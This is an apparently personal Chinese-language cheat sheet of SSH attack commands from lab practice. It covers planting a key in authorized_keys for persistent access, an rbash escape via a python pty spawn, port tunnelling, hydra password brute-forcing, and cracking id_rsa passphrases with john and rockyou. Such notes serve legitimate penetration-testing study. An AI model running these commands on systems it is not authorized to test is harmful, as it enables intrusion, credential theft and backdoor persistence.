# 22(ssh)

1. 登陆格式

```bash
ssh -i [id_rsa] -p [port] [user]@[ip] "[command]"
```

1. ssh写入

```bash
ssh-keygen  ---全部回车
cd /root/.ssh 
cat id_rsa.pub   ---里面的值复制
在mnt目录下创建：mkdir .ssh   
cd .ssh  进去后写入：
echo '【id-rsa】' > authorized_keys
```

1. 简单的rbash逃逸

```bash
ssh mindy@192.168.247.167 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"
以及
先知7642
```

1. 端口转发

```bash
ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
把目标的8443隧道到本地8443
```

1. ssh爆破

```bash
hydra ssh://192.168.2.141 -L user.txt -p "xxx"
```

1. 短密钥

```bash
ssh-keygen -t ed25519 -f id_rsaed25519
```

1. 爆破id\_rsa

```bash
python /usr/share/john/ssh2john.py id_rsa > 1.txt
john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt

转变id_rsa
openssl rsa -in id_rsa -out id1_rsa  
```
